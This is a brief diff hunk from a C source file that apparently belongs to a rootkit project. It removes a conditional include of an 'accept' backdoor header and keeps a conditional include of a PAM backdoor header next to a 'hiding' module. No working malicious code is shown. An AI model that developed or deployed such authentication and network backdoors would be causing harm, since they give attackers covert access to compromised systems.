@@ -15,10 +15,6 @@
 #include "util/util.h"  /* now include util.h */
 #include "hiding/hiding.h"
 
-#ifdef USE_ACCEPT_BD
-#include "backdoor/accept.h"
-#endif
-
 #ifdef USE_PAM_BD
 #include "backdoor/pam.h"
 #endif
